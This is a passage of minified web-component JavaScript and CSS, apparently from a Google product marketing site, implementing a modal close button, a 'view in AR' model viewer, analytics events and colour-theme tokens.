        width: 34px;
        height: 34px;
      }
    }

    .modal__close:before,
    .modal__close:after {
      content: '';
      display: block;
      position: absolute;
      transition: all 250ms linear;
    }
    .modal__close:before {
      top: 50%;
      left: 50%;
      width: 16px !important;
      height: 16px !important;
      margin-top: -8px;
      margin-left: -8px;
      background-repeat: no-repeat;
      background-position: center;
      background-size: 16px;
      background-image: url('data:image/svg+xml,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%23423F3F%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22m2.06.73%2013.577%2013.577-1.697%201.697L.363%202.427z%22%2F%3E%3Cpath%20d%3D%22M.363%2014.307%2013.94.73l1.697%201.697L2.06%2016.004z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E');
      z-index: 1;
      filter: invert(1);
    }
    .modal__close:after {
      width: calc(100% + 4px);
      height: calc(100% + 4px);
      top: -2px;
      right: -2px;
      opacity: 0;
      border-radius: 100%;
      background-color: #3c4043;
      transform-origin: center center;
      transform: scale3d(0.8, 0.8, 0.8);
      z-index: 0;
    }
    .modal__close:hover {
      border-color: transparent;
      cursor: pointer;
    }
    .modal__close:hover:before {
      background-repeat: no-repeat;
      background-position: center;
      background-size: 16px;
      background-image: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTZweCIgaGVpZ2h0PSIxNnB4IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDUxLjIgKDU3NTE5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5leGl0LXdoaXRlPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+PC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9IjIwLi1EZXNrdG9wLVVJLUVsZW1lbnRzIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNjM3LjAwMDAwMCwgLTExOTkuMDAwMDAwKSIgZmlsbD0iI0ZGRkZGRiI+CiAgICAgICAgICAgIDxnIGlkPSJFeGl0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNDEuMDAwMDAwLCAxMTA1LjAwMDAwMCkiPgogICAgICAgICAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDY4LjAwMDAwMCkiIGlkPSJob3ZlciI+CiAgICAgICAgICAgICAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNDcyLjU2NjQwNiwgMy44NTE1NjIpIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMS40MzM1OTQsIDAuNTE1NjI1KSIgaWQ9ImV4aXQtd2hpdGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjIuMDAwMDAwLCAyMi4wMDAwMDApIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cmVjdCBpZD0iUmVjdGFuZ2xlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg4LjAwMDAwMCwgOC4wMDAwMDApIHJvdGF0ZSgtMzE1LjAwMDAwMCkgdHJhbnNsYXRlKC04LjAwMDAwMCwgLTguMDAwMDAwKSAiIHg9Ii0xLjYiIHk9IjYuOCIgd2lkdGg9IjE5LjIiIGhlaWdodD0iMi40Ij48L3JlY3Q+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHJlY3QgaWQ9IlJlY3RhbmdsZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoOC4wMDAwMDAsIDguMDAwMDAwKSByb3RhdGUoLTQ1LjAwMDAwMCkgdHJhbnNsYXRlKC04LjAwMDAwMCwgLTguMDAwMDAwKSAiIHg9Ii0xLjYiIHk9IjYuOCIgd2lkdGg9IjE5LjIiIGhlaWdodD0iMi40Ij48L3JlY3Q+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg==');
    }
    .modal__close:hover:after {
      opacity: 1;
      background-color: #ffffff;
      transform: scale3d(1, 1, 1);
    }
  `,zt([qn("summary")],Zi.prototype,"summary",2),zt([qn("details-dialog")],Zi.prototype,"detailsDialog",2),zt([qn("details")],Zi.prototype,"details",2),zt([qn("bento-youtube-inline")],Zi.prototype,"youtubeInline",2),zt([qn(".modal__close")],Zi.prototype,"closeButton",2),zt([Ur({type:String,attribute:"close-button-label"})],Zi.prototype,"closeButtonAriaLabel",2)})),nd,J_=Ge((()=>{Z_(),nd=class{constructor(t){this.app=t}static register(t){let e=new Zi;return e.init(t),e}}}));function i$(){return window.Mqn3.scriptLoader.load(r$,{test:()=>document.createElement("model-viewer").constructor!==HTMLElement,timeout:1e4})}var r$,sd,xa,eb,tb,rb=Ge((()=>{vn(),va(),Of(),r$="https://storage.googleapis.com/mannequin/modules/view-in-ar/model-viewer.min.js",sd={ENTER:"Enter",ESC:"Escape",TAB:"Tab"},xa=class{constructor(t){let e=Array.from(t.querySelectorAll("[view-in-ar]"));this.viewInArs=e.map((t=>new eb(t)))}static register(t){return new xa(t)}dispose(){this.viewInArs.forEach((t=>{t.dispose()}))}},eb=class{constructor(t){this.glbOptionsList=[],this.viewInArModal=null,this.el=t,this.watcher=new Ar,this.el.classList.add("id-no-nav");let e=JSON.parse(this.el.getAttribute("view-in-ar").replace(/'/g,'"'));this.setGlb(e[0])}setGlb(t){let e=this.el;if(If()){let i={file:t.glb};t.title&&(i.title=t.title),t.link&&t.link.startsWith("http")&&(i.link=t.link);let r=new URLSearchParams(i).toString(),n="intent://arvr.google.com/scene-viewer/1.1?"+r+"#Intent;scheme=https;package=com.google.android.googlequicksearchbox;action=android.intent.action.VIEW;S.browser_fallback_url="+("https://arvr.google.com/scene-viewer?"+r)+";end;";this.watcher.removeById("android-watcher"),this.watcher.add({element:e,on:"click",id:"android-watcher",callback:()=>{let t=document.createElement("img"),e=document.createElement("a");t.style.display="none",e.appendChild(t),e.setAttribute("href",n),e.setAttribute("rel","ar"),e.click()}})}else Pf()&&t.usdz?(this.watcher.removeById("ios-watcher"),this.watcher.add({element:e,on:"click",id:"ios-watcher",callback:()=>{let e=document.createElement("img"),i=document.createElement("a");e.style.display="none",i.appendChild(e),i.setAttribute("href",t.usdz),i.setAttribute("rel","ar"),i.click()}})):this.openModelViewer(t,e)}openModelViewer(t,e){this.viewInArModal?this.viewInArModal.setOptions(t):(this.viewInArModal=new tb(t),this.viewInArModal.on("open",(()=>this.trackInview())),this.viewInArModal.on("close",(t=>this.trackOutview(t))),e.addEventListener("click",(t=>{t.preventDefault(),this.viewInArModal.open()})),e.addEventListener("keydown",(t=>{t.key===sd.ENTER&&(t.preventDefault(),this.viewInArModal.open())})))}dispose(){this.watcher&&this.watcher.dispose()}trackInview(){let t=this.el.closest("bento-app"),e=t.getAttribute("template")||"undefined";t.analytics.trackDataLayer({event:"module inview",nonInteraction:"1",eventCategory:"module inview",eventAction:"modal_view_in_ar",eventLabel:"(not set)",eventParams:{pageName:window.location.pathname,pageType:"modal",moduleName:"modal_view_in_ar",moduleType:e}})}trackOutview(t){let e=this.el.closest("bento-app"),i=e.getAttribute("template")||"undefined";e.analytics.trackDataLayer({event:"module outview",nonInteraction:"1",eventCategory:"module outview",eventAction:"modal_view_in_ar",eventLabel:"(not set)",eventParams:{pageName:window.location.pathname,pageType:"modal",moduleName:"modal_view_in_ar",moduleType:i,secondsInView:t.timeElapsed}})}},tb=class{constructor(t){this.listeners={},this.onKey=t=>{t.key!==sd.ESC?t.key!==sd.TAB||this.handleFocusTrap(t):this.close()},this.glb=t.glb,this.usdz=t.usdz,this.isOpen=!1,this.watcher=new Ar,this.modalEl=null,this.watcher.add({element:document,on:"keydown",callback:t=>this.onKey(t)})}setOptions(t){this.glb=t.glb,this.usdz=t.usdz}open(){if(this.isOpen)return;this.lastKnownFocusedElement=document.activeElement,i$().then((()=>console.log("model viewer loaded")));let t=document.createElement("button");t.classList.add("mqn3-view-in-ar-modal__x"),t.setAttribute("aria-label","Close modal"),t.addEventListener("click",(()=>{this.close()}));let e=document.createElement("model-viewer");e.setAttribute("ar",""),e.setAttribute("src",this.glb),this.usdz&&e.setAttribute("ios-src",this.usdz),e.setAttribute("shadow-intensity","1"),e.setAttribute("camera-controls",""),e.setAttribute("auto-rotate",""),e.setAttribute("style",""),e.setAttribute("autoplay",""),e.setAttribute("tabindex","0"),this.watcher.add({element:e,on:"focus",callback:()=>{let t=e.shadowRoot.querySelector(".userInput");t.setAttribute("role","application"),t?.focus()}});let i=document.createElement("div");i.classList.add("mqn3-view-in-ar-modal"),i.setAttribute("role","dialog"),i.appendChild(t),i.appendChild(e),document.body.appendChild(i),this.modalEl=i,this.isOpen=!0,this.executeCallbacks("open"),this.timeOpened=Math.floor((new Date).getTime()/1e3),window.setTimeout((()=>{let t=Rf(this.modalEl);t.length>0?t[0].focus():document.activeElement&&document.activeElement.blur()}))}close(){!this.isOpen||(document.body.removeChild(this.modalEl),this.isOpen=!1,this.executeCallbacks("close"),this.timeOpened=void 0,this.lastKnownFocusedElement&&this.lastKnownFocusedElement.focus())}on(t,e){this.listeners[t]=e}executeCallbacks(t){if(this.listeners[t]){let e={modal:this};"close"===t&&(e.timeElapsed=Math.floor((new Date).getTime()/1e3)-this.timeOpened),this.listeners[t](e)}}dispose(){this.listeners={},this.watcher.dispose(),this.close()}handleFocusTrap(t){if(!this.isOpen||!this.modalEl)return;let e=Rf(this.modalEl),i=e[0],r=e[e.length-1];document.activeElement&&!this.modalEl.contains(document.activeElement)&&(t.preventDefault(),i.focus()),t.shiftKey?document.activeElement===i&&(t.preventDefault(),r.focus()):document.activeElement===r&&(t.preventDefault(),i.focus())}}})),Ia,ib=Ge((()=>{Ia=class{constructor(t){this.app=t,this.hideBreakElementsFromScreenReaders()}static register(t){return new Ia(t)}hideBreakElementsFromScreenReaders(){Array.from(this.app.querySelectorAll('[role="heading"] br, [role="text"] br')).forEach((t=>{t.setAttribute("aria-hidden","true")}))}}})),Cc,Ac,nb=Ge((()=>{(Ac=Cc=class{constructor(t){this.app=t,this.updateLegacyClasses()}static register(t){return new Cc(t)}updateLegacyClasses(){this.app.className.split(" ").forEach((t=>{let e=Cc.LegacyOptions[t];e&&this.app.classList.replace(t,e)}))}}).LegacyOptions={"mqn-opt--expressive-display":"mqn-opt--standard-display","mqn-opt--expressive-display-2":"mqn-opt--standard-heading-1","mqn-opt--expressive-heading-1":"mqn-opt--standard-heading-2","mqn-opt--expressive-heading-2":"mqn-opt--standard-heading-3","mqn-opt--expressive-heading-3":"mqn-opt--standard-heading-4","mqn-opt--expressive-heading-4":"mqn-opt--standard-heading-5","mqn-opt--expressive-heading-5":"mqn-opt--standard-heading-6","mqn-opt--expressive-heading-6":"mqn-opt--standard-heading-7"}})),Pa,sb=Ge((()=>{Pa=class{constructor(t){this.app=t,this.applyDataPrice()}static register(t){return new Pa(t)}applyDataPrice(){let t=this.app.querySelectorAll("[data-price]");t.forEach((t=>{let e,i,r=t.getAttribute("data-price").split(":");1===r.length?(i="is-was",e=r[0].trim()):(i=r[0].trim(),e=r[1].trim()),t.classList.add("is-was-price-text"),t.setAttribute("jsname","xBognb"),t.setAttribute("data-docid",e),t.setAttribute("data-display",i)})),t.length>0&&document.dispatchEvent(new CustomEvent("populatePrices"))}}})),Oa,ab=Ge((()=>{ws(),vn(),Oa=class{constructor(t){this.app=t,this.watcher=new Ar,this.watcher.add({element:this.app,on:dr.Event.MUTATION,callback:this.rewriteUrls.bind(this)}),this.watcher.add({element:this.app,on:dr.Event.DISCONNECTED,callback:this.dispose.bind(this)})}static register(t){return new Oa(t)}rewriteUrls(){Array.from(this.app.querySelectorAll(['a[href^="https://apps.apple.com"]','a[href^="https://one.google.com"]','a[href^="https://play.google.com"]','a[href^="https://safety.google"]','a[href^="https://support.google.com"]'].join(", "))).forEach((t=>{t.target="_blank"}))}dispose(){this.watcher&&this.watcher.dispose()}}})),Ra,n$,Ma,lb=Ge((()=>{var t;ws(),vn(),bs(),(t=Ra||(Ra={})).MQN_GOOGLE_ONE_USER="mqnGoogleOneUser",t.MQN_CONCIERGE_USER="mqnConciergeUser",n$=t=>{let e=t.classList.contains("mqn-opt--subscribed"),i=t.classList.contains("mqn-opt--not-subscribed");!e&&!i||wc().then((r=>{r.isSubscribedToMarketingEmails().then((r=>{t.closest(".mannequin")?.classList.toggle("is-subscribed",r),e&&!r&&(t.style.display="none"),i&&r&&(t.style.display="none")}))}))},Ma=class{constructor(t){this.app=t,this.initUserConditions(),this.watcher=new Ar,this.watcher.add({element:this.app,on:dr.Event.MUTATION,callback:this.initUserConditions.bind(this)})}static register(t){return new Ma(t)}initUserConditions(){this.initGoogleOneUser(),this.initConciergeUser(),this.initMarketingEmailSubscription()}initMarketingEmailSubscription(){n$(this.app)}initConciergeUser(){document.querySelectorAll(".mqn-opt--show-if-concierge-user, .mqn-opt--hide-if-concierge-user").length&&(this.decorateConditionalUserStatus(Ra.MQN_CONCIERGE_USER,"mqn-opt--is-concierge-user",!1),wc().then((t=>{t.fetchSubscriptionTypes().then((t=>{let e=new Set(t).has(bc.CONCIERGE);this.decorateConditionalUserStatus(Ra.MQN_CONCIERGE_USER,"mqn-opt--is-concierge-user",e)}))})))}initGoogleOneUser(){let t=!1;window._uc&&(t=JSON.parse(window._uc)[26]>0),this.decorateConditionalUserStatus(Ra.MQN_GOOGLE_ONE_USER,"mqn-opt--is-google-one-user",t)}decorateConditionalUserStatus(t,e,i){let r=new URLSearchParams(window.location.search);if(r.has(t)){let i="false"!==r.get(t);this.app.classList.toggle(e,i)}else i&&this.app.classList.add(e)}dispose(){this.watcher&&this.watcher.dispose()}}})),oo,cb=Ge((()=>{vn(),ws(),bs(),oo=class{constructor(t){this.watcher=new Ar,this.app=t,this.watcher.add({element:this.app,on:dr.Event.FIRST_DOM_AVAILABLE,callback:this.refresh.bind(this)}),this.watcher.add({element:this.app,on:dr.Event.MUTATION,callback:this.refresh.bind(this)}),this.watcher.add({element:this.app,on:dr.Event.DISCONNECTED,callback:this.dispose.bind(this)}),this.refresh()}static register(t){return new oo(t)}static replaceDataTooltips(t){let e=t.querySelectorAll("[data-tooltip]");for(let t of e)this.replaceDataTooltip(t)}static replaceDataTooltip(t){let e=t.getAttribute("data-tooltip"),i=t.innerHTML,r=document.createElement("bento-tooltip-text",{is:"bento-tooltip-text"}),n=document.createElement("bento-text",{is:"bento-text"});n.setAttribute("slot","content"),n.setAttribute("variant","body");let s=document.createElement("span");_n().then((o=>{o.setInnerHtml(n,e),o.setInnerHtml(s,i),r.appendChild(s),r.appendChild(n),t.replaceWith(r),window.dispatchEvent(new Event("populateFootnotes"))}))}refresh(){oo.replaceDataTooltips(this.app)}dispose(){this.watcher&&this.watcher.dispose()}}})),od,ub=Ge((()=>{ws(),va(),vn(),od=class{constructor(t){this._options=[],(this.host=t).addController(this)}get options(){return this.extractOptions(),[...this._options]}hostConnected(){this.extractAndApplyOptions(),this.watcher=new Ar,this.watcher.add({element:this.host,on:dr.Event.MUTATION,callback:this.extractAndApplyOptions.bind(this)})}hostDisconnected(){this.watcher?.dispose()}extractOptions(){this._options=Array.from(this.host.classList).filter((t=>t.startsWith("mqn-opt"))).map((t=>t.replace("mqn-opt--","")))}parseGradientBackgroundOptions(){let t=0,e={};return this._options.forEach((i=>{i.includes("background-gradient-")&&(e["--cms-background-gradient-"+ ++t]="#"+i.replace("background-gradient-",""))})),e["--cms-background-gradient"]=t>=2?"linear-gradient(180deg, var(--cms-background-gradient-1) 0%, var(--cms-background-gradient-2) 100%)":"initial",e}parseSolidBackgroundOptions(){let t=this._options.find((t=>t.includes("background-color-")));return t?{"--cms-background-color":"#"+t.replace("background-color-","")}:{}}parseSurfaceOptions(){let t=this._options.find((t=>t.includes("color-surface1-")));return t?{"--cms-sys-color-surface1":"#"+t.replace("color-surface1-","")}:{}}extractAndApplyOptions(){this.extractOptions(),Qy(this.host,{...this.parseSolidBackgroundOptions(),...this.parseGradientBackgroundOptions(),...this.parseSurfaceOptions()})}}})),$a,Tc=Ge((()=>{$a=class extends Event{constructor(t,e,i){super("context-request",{bubbles:!0,composed:!0}),this.context=t,this.callback=e,this.subscribe=i}}}));function ad(t){return t}var hb=Ge((()=>{})),xc,ld=Ge((()=>{Tc(),xc=class{constructor(t,e,i,r=!1){this.host=t,this.context=e,this.callback=i,this.subscribe=r,this.provided=!1,this.value=void 0,this.host.addController(this)}hostConnected(){this.dispatchRequest()}hostDisconnected(){this.unsubscribe&&(this.unsubscribe(),this.unsubscribe=void 0)}dispatchRequest(){this.host.dispatchEvent(new $a(this.context,((t,e)=>{this.unsubscribe&&(this.unsubscribe!==e&&(this.provided=!1,this.unsubscribe()),this.subscribe||this.unsubscribe()),this.value=t,this.host.requestUpdate(),this.provided&&!this.subscribe||(this.provided=!0,this.callback&&this.callback(t,e)),this.unsubscribe=e}),this.subscribe))}}})),cd,fb=Ge((()=>{cd=class{constructor(t){this.callbacks=new Map,this.updateObservers=()=>{for(let[t,e]of this.callbacks)t(this.t,e)},void 0!==t&&(this.value=t)}get value(){return this.t}set value(t){this.setValue(t)}setValue(t,e=!1){let i=e||!Object.is(t,this.t);this.t=t,i&&this.updateObservers()}addCallback(t,e){e&&(this.callbacks.has(t)||this.callbacks.set(t,(()=>{this.callbacks.delete(t)}))),t(this.value)}clearCallbacks(){this.callbacks.clear()}}})),db,Ic,ud=Ge((()=>{fb(),db=class extends Event{constructor(t){super("context-provider",{bubbles:!0,composed:!0}),this.context=t}},Ic=class extends cd{constructor(t,e,i){super(i),this.host=t,this.context=e,this.onContextRequest=t=>{t.context===this.context&&t.composedPath()[0]!==this.host&&(t.stopPropagation(),this.addCallback(t.callback,t.subscribe))},this.attachListeners(),this.host.addController(this)}attachListeners(){this.host.addEventListener("context-request",this.onContextRequest)}hostConnected(){this.host.dispatchEvent(new db(this.context))}}})),pb=Ge((()=>{Tc()}));function Pc({context:t}){return Li({finisher:(e,i)=>{let r=new WeakMap;e.addInitializer((e=>{r.set(e,new Ic(e,t))}));let n=Object.getOwnPropertyDescriptor(e.prototype,i),s=null==n?void 0:n.set,o={...n,set:function(t){var e;null===(e=r.get(this))||void 0===e||e.setValue(t),s&&s.call(this,t)}};Object.defineProperty(e.prototype,i,o)}})}var hd=Ge((()=>{yn(),ud()}));function Oc({context:t,subscribe:e}){return Li({finisher:(i,r)=>{i.addInitializer((i=>{new xc(i,t,(t=>{i[r]=t}),e)}))}})}var fd=Ge((()=>{yn(),ld()})),mb=Ge((()=>{Tc(),hb(),ld(),ud(),pb(),hd(),hd(),fd(),fd()})),vb,gb=Ge((()=>{vb=":host {\n  --bd-sys-color-primary: #8AB4F8;\n  --bd-sys-color-primaryContainer: magenta;\n  --bd-sys-color-onPrimary: #202124;\n  --bd-sys-color-secondary: #FFFFFF;\n  --bd-sys-color-secondaryContainer: magenta;\n  --bd-sys-color-onSecondary: magenta;\n  --bd-sys-color-tertiary: #34A853;\n  --bd-sys-color-tertiaryContainer: magenta;\n  --bd-sys-color-onTertiary: magenta;\n  --bd-sys-color-error: #EE675C;\n  --bd-sys-color-errorContainer: magenta;\n  --bd-sys-color-onError: magenta;\n  --bd-sys-color-background: #050505;\n  --bd-sys-color-background-hover: #202124;\n  --bd-sys-color-onBackground: #FFFFFF;\n  --bd-sys-color-onBackground-highContrast: #FFFFFF;\n  --bd-sys-color-surface: #050505;\n  --bd-sys-color-surface1: #202124;\n  --bd-sys-color-surface1-hover: #313337;\n  --bd-sys-color-surface1-active: #393b3d;\n  --bd-sys-color-surface2: #3C4043;\n  --bd-sys-color-onSurface: #FFFFFF;\n  --bd-sys-color-onSurfaceVariant: #FFFFFF;\n  --bd-sys-color-outline: #F8F9FA;\n  --bd-sys-color-disabled: #5F6368;\n  --bd-sys-color-onDisabled: #9AA0A6;\n  --bd-sys-color-divider: #5F6368;\n}"})),_b,yb=Ge((()=>{_b=":host {\n  --bd-sys-color-primary: #1967D2;\n  --bd-sys-color-primaryContainer: #E8F0FE;\n  --bd-sys-color-onPrimary: #FFFFFF;\n  --bd-sys-color-secondary: #3C4043;\n  --bd-sys-color-secondaryContainer: #F8F9FA;\n  --bd-sys-color-onSecondary: #FFFFFF;\n  --bd-sys-color-tertiary: #188038;\n  --bd-sys-color-tertiaryContainer: #E6F4EA;\n  --bd-sys-color-onTertiary: #FFFFFF;\n  --bd-sys-color-error: #D93025;\n  --bd-sys-color-errorContainer: #FCE8E6;\n  --bd-sys-color-onError: #FFFFFF;\n  --bd-sys-color-background: #FFFFFF;\n  --bd-sys-color-background-hover: #EFF0F0;\n  --bd-sys-color-onBackground: #3C4043;\n  --bd-sys-color-onBackground-highContrast: #202124;\n  --bd-sys-color-surface: #FFFFFF;\n  --bd-sys-color-surface1: #F8F9FA;\n  --bd-sys-color-surface1-hover: #f0f2f4;\n  --bd-sys-color-surface1-active: #eceef0;\n  --bd-sys-color-surface2: #F1F3F4;\n  --bd-sys-color-onSurface: #3C4043;\n  --bd-sys-color-onSurfaceVariant: #5F6368;\n  --bd-sys-color-outline: #DADCE0;\n  --bd-sys-color-disabled: #DADCE0;\n  --bd-sys-color-onDisabled: #9AA0A6;\n  --bd-sys-color-divider: #DADCE0;\n}"})),dd,bb=Ge((()=>{dd=":host {\n  --bd-sys-color-primary: #8AB4F8;\n  --bd-sys-color-primaryContainer: magenta;\n  --bd-sys-color-onPrimary: #202124;\n  --bd-sys-color-secondary: #FFFFFF;\n  --bd-sys-color-secondaryContainer: magenta;\n  --bd-sys-color-onSecondary: magenta;\n  --bd-sys-color-tertiary: #34A853;\n  --bd-sys-color-tertiaryContainer: magenta;\n  --bd-sys-color-onTertiary: magenta;\n  --bd-sys-color-error: #EE675C;\n  --bd-sys-color-errorContainer: magenta;\n  --bd-sys-color-onError: magenta;\n  --bd-sys-color-background: #181A18;\n  --bd-sys-color-background-hover: #30332F;\n  --bd-sys-color-onBackground: #FFFFFF;\n  --bd-sys-color-onBackground-highContrast: #FFFFFF;\n  --bd-sys-color-surface: #181A18;\n  --bd-sys-color-surface1: #30332F;\n  --bd-sys-color-surface1-hover: #30332F;\n  --bd-sys-color-surface1-active: #30332F;\n  --bd-sys-color-surface2: #3C403B;\n  --bd-sys-color-onSurface: #FFFFFF;\n  --bd-sys-color-onSurfaceVariant: #FFFFFF;\n  --bd-sys-color-outline: #788076;\n  --bd-sys-color-divider: #788076;\n  --bd-sys-color-disabled: #5F6368;\n  --bd-sys-color-onDisabled: #9AA0A6;\n}"})),pd,wb=Ge((()=>{pd=":host {\n  --bd-sys-color-primary: #1967D2;\n  --bd-sys-color-primaryContainer: #E8F0FE;\n  --bd-sys-color-onPrimary: #FFFFFF;\n  --bd-sys-color-secondary: #3C4043;\n  --bd-sys-color-secondaryContainer: #F8F9FA;\n  --bd-sys-color-onSecondary: #FFFFFF;\n  --bd-sys-color-tertiary: #188038;\n  --bd-sys-color-tertiaryContainer: #E6F4EA;\n  --bd-sys-color-onTertiary: #FFFFFF;\n  --bd-sys-color-error: #D93025;\n  --bd-sys-color-errorContainer: #FCE8E6;\n  --bd-sys-color-onError: #FFFFFF;\n  --bd-sys-color-background: #FFFFFF;\n  --bd-sys-color-background-hover: #EAF5D6;\n  --bd-sys-color-onBackground: #3C4043;\n  --bd-sys-color-onBackground-highContrast: #202124;\n  --bd-sys-color-surface: #FFFFFF;\n  --bd-sys-color-surface1: #EAF5D6;\n  --bd-sys-color-surface1-hover: #EAF5D6;\n  --bd-sys-color-surface1-active: #EAF5D6;\n  --bd-sys-color-surface2: #D2EE9F;\n  --bd-sys-color-onSurface: #3C4043;\n  --bd-sys-color-onSurfaceVariant: #5F6368;\n  --bd-sys-color-outline: #DADCE0;\n  --bd-sys-color-disabled: #DADCE0;\n  --bd-sys-color-onDisabled: #9AA0A6;\n  --bd-sys-color-divider: #DADCE0;\n}"})),pi,Es,AG,CG,c$,Eb,Sb,Ab=Ge((()=>{var t,e;mb(),ys(),gb(),yb(),bb(),wb(),(t=pi||(pi={})).LIGHT="light",t.DARK="dark",(e=Es||(Es={})).DEFAULT="default",e.C22="c22",e.P22="p22",AG=Object.values(Es),CG=Object.values(pi),c$=Object.freeze({[Es.DEFAULT]:{[pi.LIGHT]:_b,[pi.DARK]:vb},[Es.C22]:{[pi.LIGHT]:dd,[pi.DARK]:dd},[Es.P22]:{[pi.LIGHT]:pd,[pi.DARK]:pd}}),Eb=ad("litBentoTokenContext"),Sb=t=>{let e=class extends t{constructor(){super(...arguments),this.tokenContext=e.generateContext(this)}static generateContext(t){return{get theme(){return t.theme},get mode(){return t.mode}}}get theme(){return this.explicitTheme??this.parentTokenContext?.theme??Es.DEFAULT}set theme(t){let e=this.theme;this.explicitTheme=t,this.requestUpdate("theme",e)}get mode(){return this.explicitMode??this.parentTokenContext?.mode??pi.LIGHT}set mode(t){let e=this.mode;this.explicitMode=t,this.requestUpdate("mode",e)}getTokenCssVars(){return this.theme&&this.mode&&(this.theme!==this.parentTokenContext?.theme||this.mode!==this.parentTokenContext?.mode)?c$[this.theme][this.mode]:""}},i=e;return zt([Oc({context:Eb,subscribe:!0})],i.prototype,"parentTokenContext",2),zt([Pc({context:Eb})],i.prototype,"tokenContext",2),zt([Ur({attribute:"theme",reflect:!0})],i.prototype,"theme",1),zt([Ur({attribute:"mode",reflect:!0})],i.prototype,"mode",1),i}}));function md(t){class e extends(Sb(t)){connectedCallback(){super.connectedCallback(),this.setTempDarkClass()}setTempDarkClass(){this.classList.toggle("mqn-opt--dark",this.mode===pi.DARK)}willUpdate(t){super.willUpdate(t),this.setTempDarkClass()}getTokenCssVars(){return`\n        ${dc(super.getTokenCssVars())} :host {\n          --theme-text-color: var(--bd-sys-color-onBackground);\n        }\n      `}}return e}var gd,Cb=Ge((()=>{Aa(),Ab(),jf(),gd=class extends(md(ei)){render(){return Vn`
      <style>
        ${this.getTokenCssVars()}
      </style>
      <slot></slot>
    `}},gd=zt([yc("bento-theme")],gd)})),vd,Bn,dr,ws=Ge((()=>{var t;J_(),rb(),ys(),Sc(),ib(),nb(),sb(),Aa(),ab(),Zf(),lb(),cb(),ub(),td(),Cb(),(t=vd||(vd={})).NEO_TRACKING_NAVIGATION="trackingNavigationEvent",t.FIRST_UPDATED="firstUpdated",t.FIRST_DOM_AVAILABLE="firstDomAvailable",t.MUTATION="frameMutation",t.DISCONNECTED="disconnected",Bn=class extends(md(Ec(ei))){constructor(){super(),this.optionsController=new od(this),this.hasFirstUpdateCompleted=!1,window.Mqn3||(window.Mqn3={})}get options(){return this.optionsController.options}connectedCallback(){super.connectedCallback(),this.convertLegacyOptions=Ac.register(this),this.addUserConditions=Ma.register(this),this.disableAnalytics||(this.analytics=La.register(this)),this.replaceDataTooltips=oo.register(this),this.rewriteUrls=Oa.register(this),window.Mqn3.scriptLoader||(window.Mqn3.scriptLoader=new Ta)}async firstUpdated(){await this.updateComplete,this.dispatch(Bn.Event.FIRST_UPDATED,{})}onSlotChange(){this.hasFirstUpdateCompleted||(this.hasFirstUpdateCompleted=!0,this.dispatch(Bn.Event.FIRST_DOM_AVAILABLE,{}),this.breakBrElements=Ia.register(this),this.dataPrice=Pa.register(this),this.addViewInAr=xa.register(this),this.youtubeModal=nd.register(this)),this.updateProps(),this.dispatch(Bn.Event.MUTATION,{})}updateProps(){Array.from(this.querySelectorAll("bento-copy-group")).forEach((t=>{t.adoptFrameHeadlineSize&&(Bn.mapClassToAttribute(this.options,t,"headline-variant",{"standard-display":"display-large","standard-heading-1":"display-medium","standard-heading-2":"display-small","standard-heading-3":"headline-large","standard-heading-4":"headline-medium","standard-heading-5":"headline-small","standard-heading-6":"title-large","standard-heading-7":"title-medium"}),Bn.mapClassToAttribute(this.options,t,"vertical-stack-buttons",{"side-by-side-buttons":"false; tabletLt: true;","vertical-stack-buttons":"true"}))}))}static mapClassToAttribute(t,e,i,r){t.forEach((t=>{r[t]&&e.setAttribute(i,r[t])}))}render(){return Vn` <style>
        ${this.getTokenCssVars()}
      </style>
